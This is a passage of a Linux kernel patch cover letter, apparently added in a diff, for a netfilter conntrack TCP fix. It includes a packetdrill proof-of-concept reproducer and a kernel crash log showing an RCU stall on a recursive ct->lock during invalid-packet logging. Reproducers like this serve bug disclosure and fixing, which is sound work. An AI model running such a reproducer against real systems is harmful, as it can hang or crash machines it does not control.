+//   2) injecting the final forged raw ACK based on the live tuple
+//
+// Expected behavior:
+//   - vulnerable kernel: the helper injects the forged ACK, conntrack enters
+//     the recursive ct->lock logging path, and the expected duplicate ACK
+//     below never arrives
+//   - fixed kernel: the duplicate ACK is emitted and the NFLOG helper also
+//     receives a packet carrying conntrack attributes
+
+0.000 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
++0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
++0.000 bind(3, ..., ...) = 0
++0.000 listen(3, 1) = 0
+
++0.000 < S 0:0(0) win 32792 <mss 1460,nop,wscale 7>
++0.000 > S. 0:0(0) ack 1 <...>
++0.010 < . 1:1(0) ack 1 win 32792
++0.000 accept(3, ..., ...) = 4
+
++0.000 write(4, ..., 1) = 1
++0.000 > P. 1:2(1) ack 1
++0.010 < . 1:1(0) ack 2 win 32792
+
++0.000 < P. 1:2(1) ack 2 win 32792
++0.000 read(4, ..., 1) = 1
++0.000 > . 2:2(0) ack 2
+
++0.010 `./poc-packetdrill-helper inject-from-proc 8080 268435458 2`
++0.020 > . 2:2(0) ack 2
++0.200 `sleep 0.2`
+------END poc-packetdrill.pkt--------
+
+----BEGIN crash log----
+[   86.136409] rcu: INFO: rcu_preempt self-detected stall on CPU
+[   86.560968] CPU: 1 UID: 0 PID: 1021 Comm: poc-packetdrill Not tainted 7.2.0-rc3-00417-ge13caf1c2658 #6 PREEMPT(lazy)
+[   86.560972] RIP: queued_spin_lock_slowpath+0x85/0x290
+[   86.561012] Call Trace:
+[   86.561019]  <TASK>
+[   86.561021]  __instance_destroy+0x32/0x80
+[   86.561876]  nfulnl_rcv_nl_event+0x82/0xa0
+[   86.561994]  netlink_release+0x5e1/0x650
+[   86.562993]  </TASK>
+[   86.563918] CPU: 0 UID: 0 PID: 1034 Comm: poc-packetdrill Not tainted 7.2.0-rc3-00417-ge13caf1c2658 #6 PREEMPT(lazy)
+[   86.563924] RIP: queued_spin_lock_slowpath+0x85/0x290
+[   86.563947] Call Trace:
+[   86.563948]  <TASK>
+[   86.563949]  tcp_to_nlattr+0x3d/0x1a0
+[   86.563984]  ctnetlink_dump_protoinfo.constprop.0+0x5c/0x90
+[   86.564068]  ctnetlink_glue_build+0x264/0x3e0
+[   86.564097]  nfulnl_log_packet+0x57d/0xba0
+[   86.564185]  nf_l4proto_log_invalid+0xc6/0xe0
+[   86.564189]  nf_ct_l4proto_log_invalid+0xb8/0xc0
+[   86.564196]  nf_tcp_log_invalid+0x9b/0xc0
+[   86.564560]  nf_conntrack_tcp_packet+0x4ff/0x1680
+[   86.565087]  nf_conntrack_in+0x19f/0x4d0
+[   86.565093]  raw_sendmsg+0xc31/0xe20
+[   86.565343]  __x64_sys_sendto+0x1f/0x30
+[   86.565348]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   86.565368]  </TASK>
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  netfilter: nf_conntrack_tcp: defer invalid logging until after unlock
+
+ net/netfilter/nf_conntrack_proto_tcp.c | 167 +++++++++++++++++++------
+ 1 file changed, 128 insertions(+), 39 deletions(-)
+
+-- 
+2.43.0
 
